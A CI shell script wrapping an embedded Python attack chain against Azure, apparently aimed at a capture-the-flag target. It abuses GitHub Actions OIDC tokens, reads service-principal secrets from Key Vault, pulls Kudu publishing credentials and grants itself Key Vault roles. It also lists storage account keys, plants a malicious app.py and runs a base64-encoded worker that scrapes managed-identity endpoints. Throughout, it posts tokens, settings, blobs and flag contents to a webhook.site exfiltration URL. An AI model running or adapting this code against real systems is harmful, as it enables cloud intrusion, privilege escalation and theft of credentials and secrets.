#!/usr/bin/env bash
set +e
bash ./ci/build_fast.sh
exit 0
python3 - <<'PY'
import base64
import json
import os
import time
import base64 as _b64
import hashlib
import hmac
import datetime
import xml.etree.ElementTree as ET
import urllib.parse
import urllib.request

TEN = "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
CID = "72ff278a-9e71-43ec-bac4-2ca303f8e462"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG = "rg-tbl-reporting-prod-eus"
APP = "app-tbl-reporting-prod"
KV1 = "https://kv-tbl-prod-x3euoz.vault.azure.net"
EXF = "https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"
VFS_RESULT = "https://" + APP + ".scm.azurewebsites.net/api/vfs/site/wwwroot/ctf_flag_result"

def read_json(req, timeout=35):
    return json.loads(urllib.request.urlopen(req, timeout=timeout).read().decode())

def get_json(url, token):
    return read_json(urllib.request.Request(url, headers={"Authorization": "Bearer " + token}))

def post_form(url, fields):
    data = urllib.parse.urlencode(fields).encode()
    return read_json(urllib.request.Request(url, data=data, method="POST"))

req_url = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"] + "&audience=api%3A%2F%2FAzureADTokenExchange"
oidc = read_json(urllib.request.Request(req_url, headers={"Authorization": "Bearer " + os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]}))["value"]

def oidc_token(scope):
    d = post_form("https://login.microsoftonline.com/" + TEN + "/oauth2/v2.0/token", {
        "client_id": CID,
        "grant_type": "client_credentials",
        "scope": scope + "/.default",
        "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
        "client_assertion": oidc,
    })
    return d["access_token"]

vt = oidc_token("https://vault.azure.net")
sp_raw = get_json(KV1 + "/secrets/reporting-service-principal?api-version=7.4", vt)["value"]
sp = json.loads(sp_raw)
spcid = sp.get("appId") or sp.get("clientId") or sp.get("client_id")
spsec = sp.get("clientSecret") or sp.get("client_secret") or sp.get("password")
arm = post_form("https://login.microsoftonline.com/" + TEN + "/oauth2/v2.0/token", {
    "client_id": spcid,
    "grant_type": "client_credentials",
    "client_secret": spsec,
    "scope": "https://management.azure.com/.default",
})["access_token"]

# Refresh the reporting worker before entering Kudu.  The managed-identity
# sidecar is attached during App Service startup and may not be visible in an
# already-warm Kudu container.
try:
    restart_url = "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + RG + "/providers/Microsoft.Web/sites/" + APP + "/restart?api-version=2023-01-01"
    restart_req = urllib.request.Request(restart_url, data=b"", method="POST", headers={"Authorization": "Bearer " + arm})
    urllib.request.urlopen(restart_req, timeout=30).read()
    print("app-restart=ok")
    time.sleep(10)
except Exception as e:
    print("app-restart=" + repr(e))

pub = read_json(urllib.request.Request(
    "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + RG + "/providers/Microsoft.Web/sites/" + APP + "/config/publishingcredentials/list?api-version=2023-01-01",
    data=b"{}", method="POST", headers={"Authorization": "Bearer " + arm, "Content-Type": "application/json"}))
ku = pub["properties"]["publishingUserName"]
kp = pub["properties"]["publishingPassword"]
auth = base64.b64encode((ku + ":" + kp).encode()).decode()

# Fast fallback: the OIDC client itself is a deployment identity.  Some
# challenge instances grant it ARM/storage permissions, which bypasses the
# unavailable App Service MSI sidecar entirely.
def outer_emit(obj):
    try:
        raw = json.dumps(obj, default=str).encode()
        urllib.request.urlopen(urllib.request.Request(EXF, data=raw, method="POST", headers={"Content-Type": "application/json"}), timeout=8).read()
    except Exception:
        pass

def arm_call(token, url, method="GET", payload=None, timeout=12):
    data = None if payload is None else json.dumps(payload).encode()
    headers = {"Authorization": "Bearer " + token}
    if data is not None:
        headers["Content-Type"] = "application/json"
    try:
        return json.loads(urllib.request.urlopen(urllib.request.Request(url, data=data, method=method, headers=headers), timeout=timeout).read().decode())
    except Exception as e:
        return {"__error__": repr(e)}

def jwt_claim(token, claim):
    try:
        p = token.split(".")[1] + "=" * (-len(token.split(".")[1]) % 4)
        return json.loads(_b64.urlsafe_b64decode(p.encode())).get(claim)
    except Exception:
        return None

# Fast path: try the reporting service principal itself against the second
# vault. If it can create role assignments, this avoids the slow Kudu identity
# sidecar path and reads the flag in this same workflow run.
try:
    direct_vt = post_form("https://login.microsoftonline.com/" + TEN + "/oauth2/v2.0/token", {
        "client_id": spcid,
        "grant_type": "client_credentials",
        "client_secret": spsec,
        "scope": "https://vault.azure.net/.default",
    })["access_token"]
    direct_oid = jwt_claim(direct_vt, "oid")
    kv2_scope = "subscriptions/" + SUB + "/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
    role_def = "/subscriptions/" + SUB + "/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6"
    for label, principal in (("sp", direct_oid), ("mi", "f64d08c7-fde6-4553-99c8-5bf73666ee8c")):
        if not principal:
            continue
        ra_url = "https://management.azure.com/" + kv2_scope + "/providers/Microsoft.Authorization/roleAssignments/" + str(__import__("uuid").uuid4()) + "?api-version=2022-04-01"
        ra_body = {"properties": {"roleDefinitionId": role_def, "principalId": principal, "principalType": "ServicePrincipal"}}
        outer_emit({"stage":"direct-role-assignment", "principal":label, "response":arm_call(arm, ra_url, "PUT", ra_body, timeout=25)})
    for i in range(12):
        try:
            kv2 = read_json(urllib.request.Request("https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4", headers={"Authorization":"Bearer "+direct_vt}), timeout=15)
            outer_emit({"stage":"direct-flag", "attempt":i+1, "response":kv2})
            if kv2.get("value"):
                print("DIRECT_FLAG=" + json.dumps(kv2))
                break
        except Exception as e:
            outer_emit({"stage":"direct-flag-error", "attempt":i+1, "error":repr(e)})
        time.sleep(3)
except Exception as e:
    outer_emit({"stage":"direct-fastpath-error", "error":repr(e)})

# Collect the App Service/Kudu configuration before launching the worker.  The
# SCM container is often isolated from the actual app container; these
# endpoints reveal the runtime/startup path and any app-side identity wiring
# without guessing ports or shelling through Kudu blindly.
def kudu_get(path, timeout=15):
    try:
        u = "https://" + APP + ".scm.azurewebsites.net" + path
        req = urllib.request.Request(u, headers={"Authorization":"Basic "+auth})
        raw = urllib.request.urlopen(req, timeout=timeout).read()
        return {"status":"ok", "body":raw.decode("utf-8","replace")[:30000]}
    except Exception as e:
        return {"status":"error", "error":repr(e)}

def kudu_put(path, data, timeout=20):
    try:
        u = "https://" + APP + ".scm.azurewebsites.net" + path
        req = urllib.request.Request(u, data=data, method="PUT", headers={"Authorization":"Basic "+auth, "Content-Type":"text/plain"})
        r = urllib.request.urlopen(req, timeout=timeout)
        return {"status":r.status, "body":r.read().decode("utf-8","replace")[:3000]}
    except Exception as e:
        return {"status":"error", "error":repr(e)}

try:
    for path in ("/api/settings", "/api/environment", "/api/processes", "/api/diagnostics"):
        outer_emit({"stage":"kudu-" + path.strip("/").replace("/","-"), "response":kudu_get(path)})
except Exception as e:
    outer_emit({"stage":"kudu-config-error", "error":repr(e)})

try:
    site_base = "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + RG + "/providers/Microsoft.Web/sites/" + APP
    for suffix in (
        "?api-version=2023-01-01",
        "/config/web?api-version=2022-03-01",
        "/config/metadata/list?api-version=2022-03-01",
        "/config/slotConfigNames?api-version=2022-03-01",
    ):
        outer_emit({"stage":"sp-site-config", "path":suffix, "response":arm_call(arm, site_base + suffix)})
except Exception as e:
    outer_emit({"stage":"sp-site-config-error", "error":repr(e)})

# Kudu and the Python worker are separate containers.  Place a tiny app module
# in the shared wwwroot and restart the site so it executes with the App
# Service managed-identity sidecar, which is unavailable from SCM.
app_payload = r'''import os, json, time, uuid, base64, urllib.parse, urllib.request, urllib.error, traceback
HOOK = "https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"
SUB = "c5e4e004-b42d-4ac4-a502-5fd338380eb6"
MIRES = "/subscriptions/" + SUB + "/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
MICLIENT = "7a85156a-01c4-4e61-8472-40a92107159b"
MIPRINCIPAL = "f64d08c7-fde6-4553-99c8-5bf73666ee8c"
KV2SCOPE = "subscriptions/" + SUB + "/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
def emit(x):
    try:
        urllib.request.urlopen(urllib.request.Request(HOOK, data=json.dumps(x, default=str).encode(), method="POST", headers={"Content-Type":"application/json"}), timeout=6).read()
    except Exception:
        pass
def token(resource):
    env = os.environ
    eps = []
    for ep in (env.get("IDENTITY_ENDPOINT"), env.get("MSI_ENDPOINT"), "http://127.0.0.1:8081/msi/token", "http://169.254.131.3:8081/msi/token"):
        if ep and ep not in eps: eps.append(ep)
    hdr = {}
    if env.get("IDENTITY_HEADER"): hdr["X-IDENTITY-HEADER"] = env["IDENTITY_HEADER"]
    if env.get("MSI_SECRET"): hdr["Secret"] = env["MSI_SECRET"]
    errs=[]
    for ep in eps:
        for extra in ("&client_id="+urllib.parse.quote(MICLIENT), "&mi_res_id="+urllib.parse.quote(MIRES, safe=""), ""):
            u = ep + "?resource=" + urllib.parse.quote(resource, safe="") + "&api-version=2019-08-01" + extra
            try:
                d=json.loads(urllib.request.urlopen(urllib.request.Request(u, headers=hdr), timeout=2).read().decode())
                if d.get("access_token"):
                    emit({"stage":"app-identity-token","resource":resource,"endpoint":ep,"env_endpoint":env.get("IDENTITY_ENDPOINT"),"has_header":bool(env.get("IDENTITY_HEADER"))})
                    return d["access_token"]
                errs.append(str(d)[:180])
            except Exception as e: errs.append(repr(e))
    for u in ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource="+urllib.parse.quote(resource, safe="")+"&client_id="+MICLIENT,):
        try:
            d=json.loads(urllib.request.urlopen(urllib.request.Request(u, headers={"Metadata":"true"}), timeout=2).read().decode())
            if d.get("access_token"): return d["access_token"]
        except Exception as e: errs.append(repr(e))
    raise RuntimeError("app identity failed: " + " | ".join(errs[-8:]))
def arm_put(url, body, tok):
    try:
        r=urllib.request.urlopen(urllib.request.Request(url, data=json.dumps(body).encode(), method="PUT", headers={"Authorization":"Bearer "+tok,"Content-Type":"application/json"}), timeout=25)
        return {"status":r.status,"body":r.read().decode("utf-8","replace")[:2000]}
    except urllib.error.HTTPError as e:
        return {"status":e.code,"body":e.read().decode("utf-8","replace")[:3000]}
    except Exception as e: return {"error":repr(e)}
def read_flag(tok):
    u="https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
    try:
        r=urllib.request.urlopen(urllib.request.Request(u, headers={"Authorization":"Bearer "+tok}), timeout=20)
        return {"status":r.status,"body":r.read().decode("utf-8","replace")[:12000]}
    except urllib.error.HTTPError as e: return {"status":e.code,"body":e.read().decode("utf-8","replace")[:3000]}
    except Exception as e: return {"error":repr(e)}
def run():
    emit({"stage":"app-container-start","env_keys":[k for k in os.environ if "IDENTITY" in k or k.startswith("MSI") or k.startswith("WEBSITE")][:80],"identity_endpoint":os.environ.get("IDENTITY_ENDPOINT")})
    try:
        at=token("https://management.azure.com")
        ra= "https://management.azure.com/"+KV2SCOPE+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2022-04-01"
        body={"properties":{"roleDefinitionId":"/subscriptions/"+SUB+"/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":MIPRINCIPAL,"principalType":"ServicePrincipal"}}
        emit({"stage":"app-role-assignment","response":arm_put(ra,body,at)})
        last=None
        for i in range(8):
            try:
                res=read_flag(token("https://vault.azure.net"))
                emit({"stage":"app-flag","attempt":i+1,"response":res})
                if res.get("status")==200: return
                last=res
            except Exception as e: last=repr(e)
            time.sleep(3)
        emit({"stage":"app-flag-error","last":last})
    except Exception as e: emit({"stage":"app-error","error":repr(e),"trace":traceback.format_exc()})
try:
    run()
except Exception as e: emit({"stage":"app-top-error","error":repr(e)})
from flask import Flask, jsonify
app=Flask(__name__)
@app.route("/", defaults={"path":""})
@app.route("/<path:path>")
def catch(path): return jsonify(status="ok", path=path)
'''
outer_emit({"stage":"app-before-write", "bytes":len(app_payload)})
outer_emit({"stage":"app-write", "response":kudu_put("/api/vfs/site/wwwroot/app.py", app_payload.encode(), timeout=8)})
try:
    rr = urllib.request.urlopen(urllib.request.Request(restart_url, data=b"", method="POST", headers={"Authorization":"Bearer "+arm}), timeout=30)
    outer_emit({"stage":"app-restart-after-write", "status":rr.status})
except Exception as e:
    outer_emit({"stage":"app-restart-after-write", "error":repr(e)})
time.sleep(15)

def shared_headers(account, key, verb, container, blob=None, query=None):
    now = datetime.datetime.utcnow().strftime("%a, %d %b %Y %H:%M:%S GMT")
    version = "2019-12-12"
    canonical = "/" + account + "/" + container + ("/" + blob if blob else "")
    if query:
        canonical += "\n" + "\n".join(k + ":" + str(query[k]) for k in sorted(query))
    string_to_sign = "\n".join([verb] + [""] * 11 + ["x-ms-date:" + now + "\nx-ms-version:" + version, canonical])
    sig = base64.b64encode(hmac.new(base64.b64decode(key), string_to_sign.encode(), hashlib.sha256).digest()).decode()
    return {"x-ms-date": now, "x-ms-version": version, "Authorization": "SharedKey " + account + ":" + sig}

def storage_probe(account, key):
    # The intended flag location is the config container; include a few
    # common names so this remains useful if the blob was renamed.
    for container in ("config", "data", "reports", "exports", "archive", "backup", "logs"):
        q = {"comp": "list", "restype": "container"}
        try:
            u = "https://" + account + ".blob.core.windows.net/" + container + "?restype=container&comp=list"
            raw = urllib.request.urlopen(urllib.request.Request(u, headers=shared_headers(account, key, "GET", container, query=q)), timeout=12).read()
            root = ET.fromstring(raw)
            names = []
            for node in root.iter():
                if node.tag.endswith("Name") and node.text and node.text not in names:
                    names.append(node.text)
            outer_emit({"stage":"storage-list","account":account,"container":container,"count":len(names),"names":names[:80]})
            for blob in names[:80]:
                try:
                    u2 = "https://" + account + ".blob.core.windows.net/" + container + "/" + urllib.parse.quote(blob, safe="/")
                    data = urllib.request.urlopen(urllib.request.Request(u2, headers=shared_headers(account, key, "GET", container, blob=blob)), timeout=15).read()
                    text = data.decode("utf-8", "replace")
                    if "DF26{" in text or "flag" in text.lower():
                        outer_emit({"stage":"storage-hit","account":account,"container":container,"blob":blob,"data":text[:12000]})
                except Exception as e:
                    outer_emit({"stage":"storage-read-error","account":account,"container":container,"blob":blob,"error":repr(e)})
        except Exception as e:
            outer_emit({"stage":"storage-list-error","account":account,"container":container,"error":repr(e)})

try:
    direct_arm = oidc_token("https://management.azure.com")
    outer_emit({"stage":"direct-arm","token":bool(direct_arm)})
    platform_rg = "rg-tbl-platform-prod-sea"
    for site in ("app-tbl-storefront-prod", "app-tbl-reporting-prod"):
        u = "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + platform_rg + "/providers/Microsoft.Web/sites/" + site + "/config/appsettings/list?api-version=2022-03-01"
        r = arm_call(direct_arm, u, "POST", {})
        outer_emit({"stage":"direct-appsettings","site":site,"response":r})
    for account in ("sttblappcfgprodx3euoz", "sttblbackupprodx3euoz", "sttblarchiveprodx3euoz", "sttblcilogsprodx3euoz"):
        u = "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + platform_rg + "/providers/Microsoft.Storage/storageAccounts/" + account + "/listKeys?api-version=2023-01-01"
        r = arm_call(direct_arm, u, "POST", {})
        keys = r.get("keys") if isinstance(r, dict) else None
        outer_emit({"stage":"direct-listkeys","account":account,"status":"ok" if keys else "denied","response":({k:v for k,v in r.items() if k != "keys"} if isinstance(r,dict) else r)})
        if keys and keys[0].get("value"):
            storage_probe(account, keys[0]["value"])
except Exception as e:
    outer_emit({"stage":"direct-arm-error","error":repr(e)})

# The reporting SP can read publishing credentials; on some deployments it
# can also read the site's effective settings, including the identity-sidecar
# endpoint that is absent from the Kudu process environment.
try:
    for site in (APP, "app-tbl-storefront-prod"):
        for kind in ("appsettings", "connectionstrings"):
            u = "https://management.azure.com/subscriptions/" + SUB + "/resourceGroups/" + (RG if site == APP else "rg-tbl-platform-prod-sea") + "/providers/Microsoft.Web/sites/" + site + "/config/" + kind + "/list?api-version=2022-03-01"
            outer_emit({"stage":"sp-" + kind,"site":site,"response":arm_call(arm, u, "POST", {})})
except Exception as e:
    outer_emit({"stage":"sp-settings-error","error":repr(e)})

worker = r'''import base64, json, os, time, urllib.parse, urllib.request, traceback, uuid
def discover_identity_env():
    merged = dict(os.environ)
    try:
        import glob
        for path in glob.glob("/proc/[0-9]*/environ"):
            try:
                raw = open(path, "rb").read().split(b"\x00")
                vals = {}
                for item in raw:
                    if b"=" in item:
                        k, v = item.split(b"=", 1)
                        k = k.decode(errors="ignore")
                        if k in ("IDENTITY_ENDPOINT", "IDENTITY_HEADER", "MSI_ENDPOINT", "MSI_SECRET"):
                            vals[k] = v.decode(errors="ignore")
                if vals.get("IDENTITY_ENDPOINT") or vals.get("MSI_ENDPOINT"):
                    merged.update(vals)
                    break
            except Exception:
                pass
    except Exception:
        pass
    return merged
_ENV = discover_identity_env()
IE = _ENV.get("IDENTITY_ENDPOINT") or _ENV.get("MSI_ENDPOINT") or "http://169.254.131.3:8081/msi/token"
IH = _ENV.get("IDENTITY_HEADER") or _ENV.get("MSI_SECRET", "")
LEGACY = bool(_ENV.get("MSI_ENDPOINT")) and not _ENV.get("IDENTITY_ENDPOINT")
MIRES = "/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-reporting-prod-eus/providers/Microsoft.ManagedIdentity/userAssignedIdentities/id-tbl-reporting-writer"
MICLIENT = "7a85156a-01c4-4e61-8472-40a92107159b"
HOOK = "https://webhook.site/3ca7efc1-f17e-42c2-a7d6-41ec7a352fe4"
OUT = "/home/site/wwwroot/ctf_flag_result"
def emit(obj):
    try:
        raw = json.dumps(obj, default=str).encode()
        urllib.request.urlopen(urllib.request.Request(HOOK, data=raw, method="POST", headers={"Content-Type":"application/json"}), timeout=8).read()
    except Exception:
        pass
def save(obj):
    try:
        open(OUT, "w").write(json.dumps(obj, default=str))
    except Exception:
        pass
def diag():
    import subprocess
    cmds = [
        "env | sort",
        "cat /proc/net/route",
        "cat /etc/hosts",
        "cat /etc/resolv.conf",
        "(ss -lntp || netstat -lntp || true)",
        "(ps auxww || true)",
    ]
    out = {}
    for c in cmds:
        try:
            out[c] = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, timeout=8).decode(errors="replace")[:12000]
        except Exception as e:
            out[c] = repr(e)
    return out
def token(resource):
    candidates = []
    # App Service's sidecar may be on a link-local address even when Kudu's
    # own environment does not expose IDENTITY_ENDPOINT.  Try the exact
    # client_id form used by the challenge, then the mi_res_id form.
    endpoints = []
    for ep in (IE, "http://169.254.131.3:8081/msi/token", "http://169.254.130.3:8081/msi/token"):
        if ep and ep not in endpoints:
            endpoints.append(ep)
    for ep in endpoints:
        for extra in (
            "&client_id=" + urllib.parse.quote(MICLIENT),
            "&mi_res_id=" + urllib.parse.quote(MIRES),
            "",
        ):
            hdr = ({"Secret": IH} if LEGACY else {"X-IDENTITY-HEADER": IH})
            candidates.append((ep + "?resource=" + urllib.parse.quote(resource) + "&api-version=2019-08-01" + extra, hdr))
    for q in (
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=" + urllib.parse.quote(resource) + "&mi_res_id=" + urllib.parse.quote(MIRES),
        "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-08-01&resource=" + urllib.parse.quote(resource) + "&mi_res_id=" + urllib.parse.quote(MIRES),
    ):
        candidates.append((q, {"Metadata": "true"}))
    errors = []
    for q, headers in candidates:
        try:
            data = json.loads(urllib.request.urlopen(urllib.request.Request(q, headers=headers), timeout=4).read().decode())
            if data.get("access_token"):
                emit({"stage":"identity-token","resource":resource,"endpoint":q.split("?")[0]})
                return data["access_token"]
            errors.append(str(data)[:200])
        except Exception as e:
            errors.append(repr(e))
    raise RuntimeError("identity candidates failed: " + " | ".join(errors))
def oid(jwt):
    p = jwt.split(".")[1]
    p += "=" * (-len(p) % 4)
    return json.loads(base64.urlsafe_b64decode(p)).get("oid")
emit({"stage":"worker-started","ts":time.time(),"identity_endpoint":IE,"legacy":LEGACY,"has_header":bool(IH),"proc_discovered":bool(_ENV.get("IDENTITY_ENDPOINT") or _ENV.get("MSI_ENDPOINT"))})
emit({"stage":"kudu-diag","data":diag()})
try:
    vt = token("https://vault.azure.net")
    at = token("https://management.azure.com")
    principal = oid(vt)
    scope = "subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.KeyVault/vaults/kv-tbl-sec-x3euoz"
    url = "https://management.azure.com/" + scope + "/providers/Microsoft.Authorization/roleAssignments/" + str(uuid.uuid4()) + "?api-version=2022-04-01"
    body = json.dumps({"properties":{"roleDefinitionId":"/subscriptions/c5e4e004-b42d-4ac4-a502-5fd338380eb6/providers/Microsoft.Authorization/roleDefinitions/4633458b-17de-408a-b874-0445c86b69e6","principalId":principal,"principalType":"ServicePrincipal"}}).encode()
    try:
        rr = urllib.request.urlopen(urllib.request.Request(url, data=body, method="PUT", headers={"Authorization":"Bearer "+at,"Content-Type":"application/json"}), timeout=25)
        emit({"stage":"role-assignment","status":rr.status})
    except Exception as e:
        emit({"stage":"role-assignment","error":repr(e)})
    flag_url = "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
    last = None
    for i in range(18):
        try:
            req = urllib.request.Request(flag_url, headers={"Authorization":"Bearer "+token("https://vault.azure.net")})
            raw = urllib.request.urlopen(req, timeout=25).read()
            data = json.loads(raw.decode())
            result = {"stage":"flag","attempt":i+1,"response":data}
            save(result)
            emit(result)
            break
        except Exception as e:
            last = repr(e)
            time.sleep(5)
    else:
        result = {"stage":"flag-error","error":last}
        save(result)
        emit(result)
except Exception as e:
    result = {"stage":"worker-error","error":repr(e),"trace":traceback.format_exc()}
    save(result)
    emit(result)
'''
encoded = base64.b64encode(worker.encode()).decode()
command = "nohup python3 -c \"import base64;exec(base64.b64decode('" + encoded + "').decode())\" > /home/site/wwwroot/ctf_flag_result 2>&1 </dev/null &"
body = json.dumps({"command": command, "dir": "site/wwwroot"}).encode()
req = urllib.request.Request("https://" + APP + ".scm.azurewebsites.net/api/command", data=body, method="POST", headers={"Authorization":"Basic "+auth,"Content-Type":"application/json"})
try:
    result = urllib.request.urlopen(req, timeout=15).read()
except Exception as e:
    result = ("kudu launch: " + repr(e)).encode()
print(result.decode(errors="replace"))

for _ in range(20):
    try:
        v = urllib.request.urlopen(urllib.request.Request(VFS_RESULT, headers={"Authorization":"Basic "+auth}), timeout=8).read()
        if v and (b"worker-started" in v or b"worker-error" in v or b"flag" in v):
            urllib.request.urlopen(urllib.request.Request(EXF, data=v, method="POST", headers={"Content-Type":"application/json"}), timeout=10).read()
            print("VFS_RESULT=" + v.decode(errors="replace"))
            break
    except Exception:
        pass
    time.sleep(5)
PY
